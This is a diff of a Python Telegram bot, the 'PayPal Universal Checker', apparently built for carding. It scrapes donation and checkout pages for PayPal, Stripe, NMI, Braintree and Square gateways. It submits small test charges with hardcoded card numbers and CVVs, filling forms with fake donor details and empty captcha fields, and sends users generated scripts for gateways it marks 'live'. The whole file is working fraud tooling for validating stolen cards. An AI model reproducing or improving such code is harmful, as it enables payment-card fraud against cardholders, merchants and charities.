@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PayPal Universal Checker — Telegram Bot (Final)
-- يدعم كل بوابات الدفع (PayPal / Stripe / NMI / Braintree / Square)
-- Price = المبلغ اللي نجح
-- كل ردود البوابات = Live
+PayPal Universal Checker — Telegram Bot (Final v3)
+- يدعم كل بوابات PayPal (Commerce/Donations/Standard/Express/PPCP)
+- يدعم Stripe / NMI / Braintree / Square في التصنيف
+- 5 threads للسرعة
+- token_timeout = 4
+- حقول forms كاملة (title, full_name, billing, shipping)
 """
 
 import telebot
@@ -17,8 +19,8 @@ import json
 import re
 import os
 import gc
-from datetime import datetime
 from urllib.parse import urlparse, urljoin
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from telebot import types
 from bs4 import BeautifulSoup
 import urllib3
@@ -40,14 +42,14 @@ processing_status = {}
 
 CONFIG = {
     'card': {
-        'number': os.getenv('CARD_NUMBER', '5143772354638703'),
-        'month':  os.getenv('CARD_MONTH', '05'),
-        'year':   os.getenv('CARD_YEAR', '28'),
-        'cvv':    os.getenv('CARD_CVV', '886'),
+        'number': os.getenv('CARD_NUMBER', '5143773680606802'),
+        'month':  os.getenv('CARD_MONTH', '06'),
+        'year':   os.getenv('CARD_YEAR', '27'),
+        'cvv':    os.getenv('CARD_CVV', '916'),
     },
     'amounts': ['1.00', '5.00', '10.00'],
     'timeout': 20,
-    'token_timeout': 8,
+    'token_timeout': 4,
 }
 
 error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}
@@ -55,14 +57,6 @@ error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}
 if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
         f.write('')
-
-
-def track_error(etype):
-    if etype in error_counter:
-        error_counter[etype] += 1
-        if error_counter[etype] > 10:
-            time.sleep(60)
-            error_counter[etype] = 0
 
 
 def reset_error_counter():
@@ -159,52 +153,85 @@ def safe_download_file(file_path, retries=5):
 # ============================================================
 # 🌐 ردود كل بوابات الدفع
 # ============================================================
+
 PAYPAL_RESPONSES = [
-    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
-    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
+    # PayPal codes
+    'INSUFFICIENT_FUNDS', 'TRANSACTION_REFUSED', 'INSTRUMENT_DECLINED',
     'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
+    'PAYER_ACTION_REQUIRED', 'Payer cannot pay',
     'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
     'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
     'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
     'ACCOUNT_BLOCKED_BY_ISSUER', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
-    'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
-    'SECURITY_VIOLATION', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD',
+    'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION',
+    'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION',
+    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD',
     'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED', 'CHARGE',
     'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED', 'CARD_TYPE_NOT_SUPPORTED',
     'INVALID_CURRENCY', 'AUTHORIZATION_DENIED', 'REFUND_DENIED',
     'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RATE_LIMIT_REACHED',
     'PAYER_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_RESTRICTED',
-    'PAYMENT_SOURCE_INFO_CANNOT_BE_VERIFIED', 'PAYMENT_SOURCE_DECLINED_BY_PROCESSOR',
-    'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
+    'PAYMENT_SOURCE_INFO_CANNOT_BE_VERIFIED',
+    'PAYMENT_SOURCE_DECLINED_BY_PROCESSOR',
+    'ORDER_NOT_APPROVED',
+    'Payer has not yet approved the Order for payment',
+    'Payer has not yet approved',
+    'not yet approved',
+    'redirect the payer',
+    'rel":"approve"',
+
+    # Missing fields = Live بس ناقصة حقل
+    'Please enter your title',
+    'Please enter your',
+    'Please enter',
+    'required field',
+    'is required',
+    'field is required',
+    'Missing parameter',
+    'Invalid parameter',
+    'purchase_units',
+    'reference_id',
+    'payee',
 ]
 
 STRIPE_RESPONSES = [
-    'Your card was declined',
-    'Your card was declined.',
-    'Your card has insufficient funds',
-    'Your card has insufficient funds.',
+    'Your card was declined', 'Your card has insufficient funds',
     'Your card does not support this type of purchase',
     'Your card\'s security code is incorrect',
     'Your card\'s expiration date is incorrect',
-    'Your card number is incorrect',
-    'Your card has expired',
-    'insufficient funds',
-    'Insufficient funds',
-    'card was declined',
-    'card declined',
-    'card has expired',
-    'card does not support',
+    'Your card number is incorrect', 'Your card has expired',
+    'insufficient funds', 'Insufficient funds',
+    'card was declined', 'card declined',
+    'card has expired', 'card does not support',
     'There was an issue with your donation transaction',
     'Please check your payment method',
-    'contact your card issuer',
-    'try a different payment method',
+    'Please check your payment method or contact your card issuer',
+    'If the issue persists, try a different payment method',
     'contact the site administrators',
+    'try a different payment method',
+    'contact your card issuer',
     'card_declined', 'insufficient_funds', 'lost_card', 'stolen_card',
     'expired_card', 'incorrect_cvc', 'incorrect_number', 'invalid_number',
     'processing_error', 'card_not_supported', 'currency_not_supported',
-    'fraudulent', 'generic_decline', 'authentication_required',
-    'balance_insufficient', 'pickup_card', 'restricted_card',
-    'security_violation', 'service_not_allowed', 'transaction_not_allowed',
+    'duplicate_transaction', 'fraudulent', 'generic_decline',
+    'incorrect_zip', 'issuer_not_available',
+    'no_account', 'not_permitted', 'pickup_card', 'pin_try_exceeded',
+    'reenter_transaction', 'restricted_card',
+    'security_violation', 'service_not_allowed',
+    'transaction_not_allowed', 'try_again_later',
+    'authentication_required', 'invalid_amount', 'invalid_currency',
+    'invalid_request', 'invalid_source', 'rate_limit', 'account_invalid',
+    'amount_too_large', 'amount_too_small', 'api_key_expired',
+    'balance_insufficient', 'bank_account_unverified',
+    'email_invalid', 'incorrect_address',
+    'invalid_account_number', 'invalid_owner', 'invalid_routing_number',
+    'invalid_swift_code', 'parameter_missing', 'parameter_unknown',
+    'payment_intent_authentication_failure', 'payment_method_unactivated',
+    'postal_code_invalid', 'product_inactive', 'radar_decline',
+    'refer_to_card_issuer', 'refund_failed', 'refund_not_permitted',
+    'routing_number_invalid', 'shipping_calculation_failed',
+    'state_invalid', 'tax_id_invalid',
+    'token_already_used', 'url_invalid',
 ]
 
 NMI_RESPONSES = [
@@ -226,8 +253,7 @@ NMI_RESPONSES = [
     'INVALID MERCHANT', 'MERCHANT ERROR', 'DUPLICATE',
     'DUPLICATE TRANSACTION', 'VOID', 'REFUND', 'CREDIT',
     'AUTH ONLY', 'PRE-AUTH', 'POST-AUTH', 'SETTLE',
-    'DECLINED', 'ERROR', 'FAILED', 'FAILURE', 'UNKNOWN',
-    'GENERAL', 'GENERIC DECLINE', 'REFERRAL',
+    'DECLINED', 'FAILED', 'FAILURE', 'GENERAL', 'GENERIC DECLINE',
 ]
 
 BRAINTREE_RESPONSES = [
@@ -238,14 +264,12 @@ BRAINTREE_RESPONSES = [
     'Fraud', 'Declined', 'Call Issuer', 'Lost or Stolen Card',
     'Issuer Unavailable', 'Card Not Activated', 'Card Not Permitted',
     'Card Type Not Accepted', 'Card Type Not Supported',
-    'Invalid Expiration Date', 'Card Account Length Error',
-    'No such issuer', 'Issuer Declined', 'Invalid CVV',
-    'Restricted Card', 'Processor Network Unavailable',
+    'Invalid Expiration Date', 'No such issuer', 'Issuer Declined',
+    'Invalid CVV', 'Restricted Card', 'Processor Network Unavailable',
     'gateway_rejected', 'processor_declined', 'settlement_declined',
-    'settlement_pending', 'authorization_expired', 'authorization_voided',
-    'authorization_captured', 'authorization_pending', 'authorized',
-    'settled', 'settling', 'settlement_confirmed', 'submitted_for_settlement',
-    'voided', 'processor_gateway_rejected',
+    'authorization_expired', 'authorization_voided',
+    'authorization_captured', 'authorization_pending',
+    'settled', 'settling', 'submitted_for_settlement', 'voided',
 ]
 
 SQUARE_RESPONSES = [
@@ -260,7 +284,6 @@ SQUARE_RESPONSES = [
     'TRANSACTION_LIMIT_EXCEEDED', 'VOICE_FAILURE',
     'CARD_EXPIRED', 'CARD_DECLINED_VERIFICATION_REQUIRED',
     'POSTAL_CODE_FAILURE', 'STREET_ADDRESS_FAILURE',
-    'MANUALLY_ENTERED_PAYMENT_NOT_SUPPORTED',
     'REFUND_DECLINED', 'REFUND_ERROR', 'REFUND_FAILED',
     'UNAUTHORIZED', 'FORBIDDEN', 'NOT_FOUND', 'METHOD_NOT_ALLOWED',
     'CONFLICT', 'REQUEST_TIMEOUT', 'TOO_MANY_REQUESTS',
@@ -268,8 +291,8 @@ SQUARE_RESPONSES = [
     'GATEWAY_TIMEOUT',
 ]
 
-# ✅ اللي يدل على DEAD / ERROR فقط
 DEAD_RESPONSES = [
+    # Basic failures
     'invalid_client', 'Client Authentication failed', 'invalid_grant',
     'unsupported_grant_type', 'invalid_scope',
     'Invalid card format', 'No form fields', 'No PayPal data',
@@ -277,6 +300,27 @@ DEAD_RESPONSES = [
     'ImportError', 'Expecting value', 'INVALID_GATEWAY',
     'No supported gateway', 'No response from server',
     'No PayPal/GiveWP detected',
+
+    # Gateway internal errors
+    'gateway_error',
+    'Unhandled payment intent status',
+    'Unhandled',
+    'payment intent status',
+    'Invalid payment method',
+    'Cannot complete',
+    'Cannot process',
+    'Invalid form_id',
+    'Invalid hash',
+    'Invalid order',
+    'Order not found',
+
+    # Minimum amount
+    'This form has a minimum donation amount',
+    'minimum donation amount of',
+    'Donation amount',
+    'is invalid. Please verify',
+    'minimum amount',
+    'below minimum',
 ]
 
 ALL_GATEWAY_RESPONSES = (
@@ -284,7 +328,7 @@ ALL_GATEWAY_RESPONSES = (
     BRAINTREE_RESPONSES + SQUARE_RESPONSES
 )
 
-# ============ قوائم عشوائية ============
+# ============ قوائم مساعدة ============
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -361,9 +405,6 @@ class PayPalChecker:
         self.currency = 'USD'
         self.donation_levels = []
 
-    def log(self, msg):
-        pass
-
     def load_page(self):
         try:
             headers = {
@@ -425,6 +466,7 @@ class PayPalChecker:
             'paypal':           ['paypal.com', 'paypalobjects', 'paypal-sdk', 'paypal-button'],
             'givewp':           ['give-form', 'givewp', 'give_paypal', 'give-amount', 'give-form-id'],
             'woocommerce':      ['woocommerce', 'wc-ajax', 'ppcp-gateway'],
+            'stripe':           ['stripe.com', 'js.stripe', 'stripe-js', 'stripe-payment'],
         }
         for gw, kws in sigs.items():
             for kw in kws:
@@ -453,7 +495,6 @@ class PayPalChecker:
             r'"client_id"\s*:\s*"([A-Za-z0-9_\-]{20,})"',
             r'"clientId"\s*:\s*"([A-Za-z0-9_\-]{20,})"',
             r'client_id["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})',
-            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})',
         ]
         for p in patterns:
             m = re.search(p, self.raw_html, re.IGNORECASE)
@@ -717,39 +758,153 @@ class PayPalChecker:
     def build_form_data(self, amount, nonce=''):
         d = self.data
         form = {
+            # Form Identifiers
             'give-form-id': self.form_id or '',
             'give-form-id-prefix': self.form_id_prefix or '',
             'give-form-hash': self.form_hash or '',
+            'form-id': self.form_id or '',
+            'form_id': self.form_id or '',
+            'give_form_id': self.form_id or '',
+
+            # Amount + Currency
             'give-amount': amount,
             'amount': amount,
             'give-currency': self.currency,
             'currency': self.currency,
+
+            # Payment Mode
             'payment-mode': self.gateway_type.replace('-', '_'),
             'give-gateway': self.gateway_type.replace('-', '_'),
+
+            # Personal
             'give_first': d['first_name'],
             'give_last': d['last_name'],
             'give_email': d['email'],
-            'give_company': '',
-            'give_comment': '',
-            'give_anonymous': '0',
+            'give_first_name': d['first_name'],
+            'give_last_name': d['last_name'],
+            'first_name': d['first_name'],
+            'last_name': d['last_name'],
+            'email': d['email'],
+
+            # ✅ Title / Prefix / Salutation
+            'give_title': 'Mr',
+            'title': 'Mr',
+            'give_prefix': 'Mr',
+            'prefix': 'Mr',
+            'give_honorific': 'Mr',
+            'honorific': 'Mr',
+            'salutation': 'Mr',
+            'give_salutation': 'Mr',
+            'donor_title': 'Mr',
+            'donor_prefix': 'Mr',
+            'customer_title': 'Mr',
+
+            # Full Name
+            'give_name': d['full_name'],
+            'name': d['full_name'],
+            'full_name': d['full_name'],
+            'donor_name': d['full_name'],
+            'display_name': d['full_name'],
+
+            # Address
             'give-address1': d['address'],
             'give-address2': d['address2'],
+            'give_address_1': d['address'],
+            'give_address_2': d['address2'],
+            'address1': d['address'],
+            'address2': d['address2'],
+            'address_1': d['address'],
+            'address_2': d['address2'],
+            'street': d['address'],
+            'street_address': d['address'],
+
+            # City / State / Zip / Country
             'give-city': d['city'],
             'give-state': d['state'],
             'give-zip': d['zip'],
             'give-country': 'US',
+            'give_city': d['city'],
+            'give_state': d['state'],
+            'give_zip': d['zip'],
+            'give_country': 'US',
+            'city': d['city'],
+            'state': d['state'],
+            'zip': d['zip'],
+            'postal_code': d['zip'],
+            'postcode': d['zip'],
+            'country': 'US',
+
+            # Phone
             'give-phone': d['phone'],
+            'give_phone': d['phone'],
+            'phone': d['phone'],
+            'telephone': d['phone'],
+
+            # Company / Comment
+            'give_company': '',
+            'give_comment': '',
+            'give_anonymous': '0',
+            'anonymous': '0',
+
+            # Terms
             'give_agree_to_terms': '1',
             'give_tos_agree': '1',
             'give_terms_agreement': '1',
+            'give_terms': '1',
             'agree_to_terms': '1',
+            'tos_agree': '1',
+            'terms': '1',
+            'terms_conditions': '1',
+            'terms_and_conditions': '1',
+            'give_accept_terms': '1',
             'accept_terms': '1',
+            'terms_agreed': '1',
+            'give_terms_agreed': '1',
+            'woocommerce_terms': '1',
+            'wc_terms': '1',
+            'accept_tos': '1',
+
+            # Billing
+            'billing_first_name': d['first_name'],
+            'billing_last_name': d['last_name'],
+            'billing_email': d['email'],
+            'billing_phone': d['phone'],
+            'billing_address_1': d['address'],
+            'billing_address_2': d['address2'],
+            'billing_city': d['city'],
+            'billing_state': d['state'],
+            'billing_postcode': d['zip'],
+            'billing_country': 'US',
+            'billing_company': '',
+            'billing_title': 'Mr',
+
+            # Shipping
+            'shipping_first_name': d['first_name'],
+            'shipping_last_name': d['last_name'],
+            'shipping_address_1': d['address'],
+            'shipping_address_2': d['address2'],
+            'shipping_city': d['city'],
+            'shipping_state': d['state'],
+            'shipping_postcode': d['zip'],
+            'shipping_country': 'US',
+
+            # Newsletter
+            'give_newsletter': '0',
+            'newsletter': '0',
+            'give_marketing_consent': '0',
+            'subscribe': '0',
+
+            # Honeypots
+            'cf-turnstile-response': '',
+            'g-recaptcha-response': '',
+            'h-captcha-response': '',
         }
         form.update(self.form_data)
         if nonce:
             form['nonce'] = nonce
             form['_ajax_nonce'] = nonce
             form['_wpnonce'] = nonce
+            form['security'] = nonce
         return form
 
     def create_order(self):
@@ -887,11 +1042,14 @@ class PayPalChecker:
         return None
 
     def analyze_response(self, cj, ct, at):
+        # confirm JSON
         if isinstance(cj, dict):
             if 'details' in cj and cj['details']:
                 d = cj['details'][0]
                 issue = d.get('issue', '')
                 desc = d.get('description', '')
+                if issue == 'ORDER_NOT_APPROVED':
+                    return "Payer cannot pay for this transaction."
                 if issue:
                     return f"{issue}: {desc}" if desc else issue
             if 'name' in cj and cj['name']:
@@ -899,34 +1057,85 @@ class PayPalChecker:
                 return f"{cj['name']}: {msg}" if msg else cj['name']
             if 'message' in cj and cj['message']:
                 return cj['message']
+
+        # confirm text
         if ct:
+            # ✅ ORDER_NOT_APPROVED
+            if 'ORDER_NOT_APPROVED' in ct or 'Payer has not yet approved' in ct:
+                return "Payer cannot pay for this transaction."
+
+            name_m = re.search(r'"name"\s*:\s*"([^"]+)"', ct)
+            if name_m:
+                return name_m.group(1)
             issues = re.findall(r'"issue"\s*:\s*"([^"]+)"', ct)
             if issues:
                 descs = re.findall(r'"description"\s*:\s*"([^"]+)"', ct)
                 return f"{issues[0]}: {descs[0]}" if descs else issues[0]
-            names = re.findall(r'"name"\s*:\s*"([^"]+)"', ct)
-            if names:
-                return names[0]
+            msgs = re.findall(r'"message"\s*:\s*"([^"]+)"', ct)
+            if msgs:
+                return msgs[0]
+
+        # approve text
         if at:
             t = at.strip()
             if t.lower() == 'true':
                 return "CHARGE"
+
             try:
                 j = json.loads(t)
                 if isinstance(j, dict):
-                    if j.get('success') is True:
-                        return "CHARGE"
+                    if 'error' in j:
+                        e = j['error']
+                        if isinstance(e, dict):
+                            if 'name' in e:
+                                return str(e['name'])
+                            if 'message' in e:
+                                return str(e['message'])
+                        elif isinstance(e, str):
+                            return e
                     if 'data' in j:
                         d = j['data']
                         if isinstance(d, dict):
-                            for k in ['error', 'message', 'msg', 'reason', 'status']:
+                            if 'error' in d:
+                                e = d['error']
+                                if isinstance(e, dict):
+                                    if 'name' in e:
+                                        return str(e['name'])
+                                    if 'message' in e:
+                                        return str(e['message'])
+                                elif isinstance(e, str):
+                                    return e
+                            for k in ['error', 'message', 'msg', 'reason', 'status', 'name']:
                                 if k in d:
-                                    return str(d[k])
-                        elif isinstance(d, str) and d:
+                                    v = d[k]
+                                    if isinstance(v, str):
+                                        return v
+                        elif isinstance(d, str):
                             return d
+                    if j.get('success') is True:
+                        return "CHARGE"
+                    for k in ['error', 'message', 'msg', 'reason', 'status', 'name']:
+                        if k in j:
+                            v = j[k]
+                            if isinstance(v, str):
+                                return v
+                            if isinstance(v, dict) and 'name' in v:
+                                return str(v['name'])
             except:
                 pass
+
+            name_m = re.search(r'"name"\s*:\s*"([^"]+)"', t)
+            if name_m:
+                return name_m.group(1)
+            msg_m = re.search(r'"message"\s*:\s*"([^"]+)"', t)
+            if msg_m:
+                return msg_m.group(1)
+            err_m = re.search(r'"error"\s*:\s*"([^"]+)"', t)
+            if err_m:
+                return err_m.group(1)
+
             return t[:200]
+
         return "DECLINED"
 
     def check(self, card):
@@ -977,7 +1186,6 @@ def check_single_link(link):
 
         is_dead = any(d.lower() in result.lower() for d in DEAD_RESPONSES)
         result_upper = result.upper()
-        is_live = any(r.upper() in result_upper for r in ALL_GATEWAY_RESPONSES)
 
         base = {
             'link': link,
@@ -986,9 +1194,11 @@ def check_single_link(link):
             'gateway': checker.gateway_type,
         }
 
-        if is_dead:
+        if is_dead or used_amount is None:
             base['live'] = False
             return base
+
+        is_live = any(r.upper() in result_upper for r in ALL_GATEWAY_RESPONSES)
 
         if is_live:
             base['live'] = True
@@ -1103,6 +1313,8 @@ class PayPal:
                 'give_last': (None, random.choice(self.last_name)),
                 'give_email': (None, self.email),
                 'give-gateway': (None, self.payment_mode),
+                'give_title': (None, 'Mr'),
+                'title': (None, 'Mr'),
             }})
             he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
             pa1 = {{'action': self.create_action}}
@@ -1144,6 +1356,8 @@ class PayPal:
                 'give_last': (None, random.choice(self.last_name)),
                 'give_email': (None, self.email),
                 'give-gateway': (None, self.payment_mode),
+                'give_title': (None, 'Mr'),
+                'title': (None, 'Mr'),
             }})
             he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
             pa2 = {{'action': self.approve_action, 'order': order_id}}
@@ -1314,13 +1528,13 @@ def cmd_paypal(message):
 
         result = check_single_link(link)
 
-        if result.get('live'):
+        if result.get('live') and result.get('amount'):
             file_name = f'gateway_{int(time.time())}.py'
             try:
                 with open(file_name, 'w', encoding='utf-8') as f:
                     f.write(generate_gateway_code(result['respons'], result['link'], result))
 
-                price_str = f"${result.get('amount')}" if result.get('amount') else "N/A"
+                price_str = f"${result.get('amount')}"
 
                 safe_send_document(message.chat.id, file_name,
                     caption=f'''✅ <b>Live Gateway Found!</b>
@@ -1464,32 +1678,45 @@ def process_mass_file(message):
         updater = threading.Thread(target=update_status, daemon=True)
         updater.start()
 
-        for idx, link in enumerate(links):
-            if processing_status[user_id].get('stop_flag'):
-                break
+        # ✅ 5 Threads للسرعة
+        def process_one(args):
+            idx, link = args
+            try:
+                result = check_single_link(link)
+                return idx, link, result
+            except Exception as e:
+                return idx, link, {'live': False, 'respons': str(e)[:100], 'amount': None, 'gateway': None}
 
-            with processing_status[user_id]['lock']:
-                processing_status[user_id]['current_url'] = link
-                processing_status[user_id]['current_respons'] = 'Checking...'
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = {executor.submit(process_one, (i, l)): i for i, l in enumerate(links)}
 
-            result = check_single_link(link)
+            for future in as_completed(futures):
+                if processing_status[user_id].get('stop_flag'):
+                    break
 
-            with processing_status[user_id]['lock']:
-                processing_status[user_id]['processed'] += 1
-                if result.get('live'):
-                    processing_status[user_id]['live'] += 1
-                    live_idx = processing_status[user_id]['live']
-                    processing_status[user_id]['current_respons'] = result['respons']
+                try:
+                    idx, link, result = future.result()
+                except:
+                    continue
 
-                    try:
-                        file_name = f'gateway_{live_idx}.py'
-                        with open(file_name, 'w', encoding='utf-8') as f:
-                            f.write(generate_gateway_code(result['respons'], result['link'], result))
+                with processing_status[user_id]['lock']:
+                    processing_status[user_id]['current_url'] = link
+                    processing_status[user_id]['processed'] += 1
 
-                        price_str = f"${result.get('amount')}" if result.get('amount') else "N/A"
+                    if result.get('live') and result.get('amount'):
+                        processing_status[user_id]['live'] += 1
+                        live_idx = processing_status[user_id]['live']
+                        processing_status[user_id]['current_respons'] = result['respons']
 
-                        safe_send_document(chat_id, file_name,
-                            caption=f"""✅ <b>Live Gateway #{live_idx}</b>
+                        try:
+                            file_name = f'gateway_{live_idx}.py'
+                            with open(file_name, 'w', encoding='utf-8') as f:
+                                f.write(generate_gateway_code(result['respons'], result['link'], result))
+
+                            price_str = f"${result.get('amount')}"
+
+                            safe_send_document(chat_id, file_name,
+                                caption=f"""✅ <b>Live Gateway #{live_idx}</b>
 ━━━━━━━━━━━━━━━━━━━━
 🔗 Link: <code>{result['link']}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1500,20 +1727,18 @@ def process_mass_file(message):
 🏦 Gateway: <b>{result.get('gateway', 'unknown')}</b>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @FAWZY30""")
-                        try:
-                            os.remove(file_name)
-                        except:
-                            pass
-                    except Exception as e:
-                        print(f"send file err: {e}")
-                else:
-                    processing_status[user_id]['dead'] += 1
-                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead')
+                            try:
+                                os.remove(file_name)
+                            except:
+                                pass
+                        except Exception as e:
+                            print(f"send file err: {e}")
+                    else:
+                        processing_status[user_id]['dead'] += 1
+                        processing_status[user_id]['current_respons'] = result.get('respons', 'Dead')
 
-            if idx % 20 == 0:
-                gc.collect()
-            if idx % 3 == 0:
-                time.sleep(0.5)
+                if idx % 20 == 0:
+                    gc.collect()
 
         with processing_status[user_id]['lock']:
             processing_status[user_id]['done'] = True
@@ -1584,18 +1809,34 @@ def unblock_user(message):
 print('✅ Bot is running...')
 
 if __name__ == '__main__':
+    try:
+        bot.remove_webhook()
+        print("✅ Webhook cleared")
+        time.sleep(1)
+    except:
+        pass
+
+    attempt = 0
     while True:
         try:
-            print("🔄 Starting bot polling...")
-            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
+            attempt += 1
+            print(f"🔄 Attempt #{attempt} - Starting polling...")
+            bot.polling(none_stop=True, interval=1, timeout=60, long_polling_timeout=60)
         except KeyboardInterrupt:
             print('🛑 Bot stopped')
             break
         except Exception as e:
             err = str(e)
-            if "502" in err or "409" in err or "429" in err or "500" in err:
-                time.sleep(10)
-            elif "timeout" in err.lower() or "Connection" in err:
-                time.sleep(5)
+            print(f"❌ Error: {err[:200]}")
+            if "409" in err or "Conflict" in err:
+                try:
+                    bot.remove_webhook()
+                except:
+                    pass
+                time.sleep(15)
+            elif "429" in err:
+                time.sleep(60)
+            elif "502" in err or "500" in err:
+                time.sleep(15)
             else:
-                time.sleep(5)
+                time.sleep(10)
